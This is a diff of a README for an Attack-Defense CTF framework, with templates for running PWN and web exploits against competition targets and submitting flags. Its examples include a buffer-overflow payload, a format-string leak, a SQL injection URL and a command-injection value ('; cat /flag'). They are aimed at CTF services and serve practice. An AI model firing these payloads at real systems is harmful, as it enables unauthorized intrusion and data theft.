@@ -5,15 +5,16 @@ A simple, batteries-included framework for Attack-Defense CTF competitions.
 ## Quick Start
 
 ```bash
-# 1. Copy template for your exploit
-cp -r example-chal chal-name
+# For PWN challenges
+cp pwn.py my_exploit.py
+# Edit: Set BINARY, PORT, implement exploit()
 
-# 2. Edit pwn.py or web.py
-#    - Set PORT for the challenge
-#    - Implement exploit() function
+# For Web challenges  
+cp web.py my_exploit.py
+# Edit: Set PORT, implement exploit()
 
-# 3. Run it
-python3 pwn.py
+# Run it
+python3 my_exploit.py
 ```
 
 ## Installation
@@ -23,6 +24,15 @@ pip install pwntools requests
 # Optional for xlsx support:
 pip install openpyxl
 ```
+
+## File Overview
+
+| File | Purpose |
+|------|---------|
+| `awd_lib.py` | Core AWD library (targets, submit, discord) |
+| `pwn_lib.py` | PWN utilities (packing, IO, GDB debugging) |
+| `pwn.py` | PWN exploit template |
+| `web.py` | Web exploit template |
 
 ## Configuration
 
@@ -56,205 +66,231 @@ chal(
 ### Running Exploits
 
 ```bash
-# Attack all targets once
-python3 my_exploit.py
+# AWD mode - attack targets
+python3 my_exploit.py              # All targets once
+python3 my_exploit.py 172.24.84.11 # Specific IP
+python3 my_exploit.py --loop       # Run continuously
+python3 my_exploit.py --info       # Show competition info
+python3 my_exploit.py --targets    # List all targets
+python3 my_exploit.py --ssh        # Get SSH command
 
-# Attack specific IP
-python3 my_exploit.py 172.24.84.11
-
-# Run continuously (loop mode)
-python3 my_exploit.py --loop
-
-# Show competition info
-python3 my_exploit.py --info
-
-# List all targets
-python3 my_exploit.py --targets
-
-# Get SSH command for a target
-python3 my_exploit.py --ssh 172.24.84.11
+# Development mode (PWN only)
+python3 my_exploit.py local        # Test locally
+python3 my_exploit.py debug        # Debug with GDB
 ```
 
-### Writing Exploits
-
-The template provides a simple structure:
+### Writing PWN Exploits
 
 ```python
+from pwn_lib import *
+from awd_lib import *
+
+BINARY = "./vuln"
+LIBC = "./libc.so.6"  # Optional
+PORT = 9999
+
+# Uncomment for local testing
+# bin, rop, libc = setup_binary(BINARY, LIBC)
+# add_breakpoint('main', 'vuln+32')
+
 def exploit(ip, port):
-    """Return flag string if successful, None otherwise."""
+    """AWD mode - return flag or None."""
     try:
-        p = remote(ip, port)
+        io = remote(ip, port)
+        s = shortcuts(io)
         
-        # Your exploit logic here
-        p.sendline(b"cat /flag")
-        flag = p.recvline().strip()
+        # Your exploit
+        payload = b"A" * 64 + p64(win_addr)
+        s.sla(b"> ", payload)
+        flag = s.ru(b"}")
         
-        p.close()
+        io.close()
         return flag
     except:
         return None
+
+def exploit_dev(io):
+    """Development mode - for local/debug testing."""
+    s = shortcuts(io)
+    # Same exploit logic
+    io.interactive()
+```
+
+### Writing Web Exploits
+
+```python
+import requests
+from awd_lib import *
+
+PORT = 8080
+
+def exploit(ip, port):
+    """Return flag or None."""
+    try:
+        url = f"http://{ip}:{port}"
+        
+        # SQL injection example
+        r = requests.get(f"{url}/api?id=' UNION SELECT flag FROM flags--")
+        return extract_flag(r.text)
+    except:
+        return None
+
+def extract_flag(text):
+    """Extract flag from response."""
+    import re
+    match = re.search(r'hkcert\d{2}\{[^}]+\}', text)
+    return match.group(0) if match else None
 ```
 
 ## API Reference
 
-### Core Functions
+### Core Functions (awd_lib)
 
 | Function | Description |
 |----------|-------------|
-| `setup_auth()` | Download PEM file and set correct permissions (600) |
-| `targets()` | Get list of target IP addresses |
-| `our_ip()` | Get our team's IP address |
+| `setup_auth()` | Download PEM file and set permissions (600) |
+| `targets()` | Get target IPs (excludes your own IP automatically) |
+| `our_ip()` | Get your team's IP address |
 | `submit(flag)` | Submit flag to scoring server |
-| `ssh_command(ip)` | Get SSH command string for target |
+| `ssh_command(ip)` | Get SSH command string |
+
+### PWN Utilities (pwn_lib)
+
+| Function | Description |
+|----------|-------------|
+| `setup_binary(path, libc)` | Setup ELF and ROP objects |
+| `add_breakpoint(*bp)` | Add GDB breakpoints |
+| `get_io(mode, ip, port)` | Get process/remote IO |
+| `shortcuts(io)` | Get IO shortcut helper |
+| `p64/p32/u64/u32` | Packing utilities |
+| `uu64/uu32` | Padded unpack (handles short data) |
+| `leak_addr(io, prefix)` | Receive and unpack leaked address |
+
+### IO Shortcuts
+
+```python
+s = shortcuts(io)
+s.sla(delim, data)  # sendlineafter
+s.sa(delim, data)   # sendafter
+s.sl(data)          # sendline
+s.sd(data)          # send
+s.rl()              # recvline
+s.ru(delim)         # recvuntil
+s.rc(n)             # recv
+s.ia()              # interactive
+```
 
 ### Discord Logging
 
 ```python
 from awd_lib import discord
 
-# Configure (optional)
 discord.configure("192.168.1.100", 4545)
-
-# Log messages
 discord.info("Starting round")
 discord.success("Got shell!", target=ip)
 discord.error("Failed", exc=e)
 discord.flag("Captured!", flag=flag, target=ip)
-discord.attack("SQLi detected", payload="' OR 1=1--")
-discord.pwned(ip, flag=flag)  # Convenience method
-```
-
-### Configuration Function
-
-```python
-chal(
-    creds_file="mqda.csv",      # Path to credentials CSV/XLSX
-    api_url="https://...",       # Flag submission API
-    token="abc123",              # API token
-    pem_url="http://...",        # PEM file download URL
-    pem_file="auth.pem",         # Local PEM filename
-    discord_host="192.168.1.1",  # Discord logger host
-    discord_port=4545,           # Discord logger port
-)
-```
-
-## File Format
-
-### Credentials File (CSV)
-
-The framework parses HKCERT-style credential files:
-
-```csv
-Login Info,
-Name,Team_01
-IP,172.24.84.10
-SecretUrl,http://10.30.16.251/.../key.pem
-
-Guest_Node,
-Name,Team_02
-IP,172.24.84.11
-
-Guest_Node,
-Name,Team_03
-IP,172.24.84.12
+discord.pwned(ip, flag=flag)
 ```
 
 ## Examples
 
-### Simple Binary Exploit
+### Buffer Overflow (PWN)
 
 ```python
 def exploit(ip, port):
     try:
-        p = remote(ip, port)
+        io = remote(ip, port)
+        s = shortcuts(io)
         
-        # Buffer overflow
         payload = b"A" * 64
         payload += p64(0x401337)  # win function
         
-        p.sendline(payload)
-        p.recvuntil(b"flag{")
-        flag = b"flag{" + p.recvuntil(b"}")
+        s.sla(b"> ", payload)
+        s.ru(b"flag{")
+        flag = b"flag{" + s.ru(b"}")
         
-        p.close()
+        io.close()
         return flag
     except:
         return None
 ```
 
-### Web Exploit
+### Format String Leak (PWN)
 
 ```python
-import requests
+def exploit(ip, port):
+    try:
+        io = remote(ip, port)
+        s = shortcuts(io)
+        
+        # Leak addresses
+        s.sla(b"> ", b"%p " * 20)
+        leaks = s.rl().split()
+        
+        # Parse leak
+        libc_leak = int(leaks[5], 16)
+        libc.address = libc_leak - libc.sym['__libc_start_main']
+        
+        # ... rest of exploit
+    except:
+        return None
+```
 
+### SQL Injection (Web)
+
+```python
 def exploit(ip, port):
     try:
         url = f"http://{ip}:{port}"
-        
-        # SQL injection
-        r = requests.get(f"{url}/api?id=' UNION SELECT flag FROM flags--")
-        
-        if "flag{" in r.text:
-            import re
-            match = re.search(r'flag\{[^}]+\}', r.text)
-            return match.group(0) if match else None
-        return None
+        r = requests.get(f"{url}/user?id=' UNION SELECT flag FROM flags--")
+        return extract_flag(r.text)
     except:
         return None
 ```
 
-### With Discord Logging
+### Command Injection (Web)
 
 ```python
-from awd_lib import discord
-
-discord.configure("192.168.1.100", 4545)
-
 def exploit(ip, port):
     try:
-        p = remote(ip, port)
-        # ... exploit logic ...
-        flag = get_flag(p)
-        
-        if flag:
-            discord.pwned(ip, flag=flag, exploit="bof_v1")
-        return flag
-    except Exception as e:
-        discord.error(f"Failed on {ip}", exc=e)
+        url = f"http://{ip}:{port}"
+        r = requests.post(f"{url}/ping", data={"host": "; cat /flag"})
+        return extract_flag(r.text)
+    except:
         return None
 ```
 
 ## Tips
 
-1. **Test single target first**: `python3 exploit.py 172.24.84.11`
-2. **Check info before running**: `python3 exploit.py --info`
-3. **Use loop mode during competition**: `python3 exploit.py --loop`
-4. **Keep exploits simple**: One vulnerability per file
-5. **Handle exceptions**: Always return `None` on failure, don't crash
+1. **Test locally first**: `python3 exploit.py local` or `debug`
+2. **Check targets**: `python3 exploit.py --info`
+3. **Use loop mode**: `python3 exploit.py --loop` during competition
+4. **One vuln per file**: Keep exploits simple and focused
+5. **Handle exceptions**: Always return `None` on failure
 
 ## Troubleshooting
 
 ### "Permission denied" for PEM file
 ```bash
-# The framework handles this automatically, but if needed:
+# Framework handles this, but if needed:
 chmod 600 auth.pem
 ```
 
 ### "Credentials file not found"
-```bash
-# Make sure mqda.csv is in the same directory
-# Or configure the path:
+```python
 chal(creds_file="/path/to/creds.csv")
 ```
 
-### Discord not logging
+### GDB not attaching
 ```python
-# Check if configured and enabled
-print(discord)  # Shows status
-
-# Test connection
-discord.test()  # Returns True if reachable
+# Check terminal setting in pwn_lib.py
+context.terminal = ["konsole", "-e"]  # or ["tmux", "splitw", "-h"]
 ```
+
+## Credits
+
+PWN template based on work by ZD (former helper and PWN player) and many PWN players.
 
 ## License
 
